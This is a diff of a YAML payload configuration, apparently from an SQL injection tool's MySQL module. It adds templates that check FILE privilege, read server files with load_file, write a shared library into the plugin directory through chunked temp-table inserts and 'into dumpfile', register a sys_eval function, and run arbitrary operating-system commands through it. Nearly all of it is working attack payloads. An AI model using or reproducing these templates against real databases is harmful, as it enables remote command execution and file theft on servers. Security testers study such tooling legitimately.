@@ -197,18 +197,41 @@ resource:
     field: trim(ifnull(`${field.value}`, 0x20))
     concat: ",0x7f,"
 
- file:
-  privilege: |
-   (
-       select if(count(*) = 1, 0x74727565, 0x66616c7365)
-       from information_schema.user_privileges
-       where grantee = concat(0x27, replace(current_user, 0x40, 0x274027), 0x27)
-       and privilege_type = 0x46494c45
-   )
-  read: load_file(0x${filepath.hex})
-  write:
-   body: (select 0x${body.hex})
-   path: into outfile '${filepath}'
+ exploit: |
+  file:
+   privilege: |
+    (
+        select if(count(*) = 1, 0x74727565, 0x66616c7365)
+        from information_schema.user_privileges
+        where grantee = concat(0x27, replace(current_user, 0x40, 0x274027), 0x27)
+        and privilege_type = 0x46494c45
+    )
+   read: load_file(0x${filepath.hex})
+  
+  udf:
+   pathPlugin: select@@plugin_dir
+   osMachine: select concat(@@version_compile_os,@@version_compile_machine)
+   addFile:
+    queryBody: "%s SELECT %s 0x%s into dumpfile '%s'"
+    netshare: "%s SELECT %s load_file('%s') into dumpfile '%s'"
+    tempTable:
+     nameDatabase: select database()
+     drop: ; drop table %s
+     confirm: |
+      select count(table_name) from information_schema.tables
+      where table_type like 'base table' and table_name = '%s'
+      and table_schema = '%s' 
+     create: ; create table %s(data longblob)
+     insertChunks: ; insert into %s(data) values (0x%s)
+     appendChunks: ; update %s set data = concat(data,0x%s)
+     dump: ; select data from %s into dumpfile '%s'
+  
+   addFunction:
+    drop: ; drop function sys_eval
+    create: ; create function sys_eval returns string soname '%s'
+    confirm: select group_concat(name)from mysql.func
+  
+   runCmd: select cast(replace(sys_eval('%s'),0xff,0x20)as char(70000) character set utf8)
 
 strategy:
  configuration:
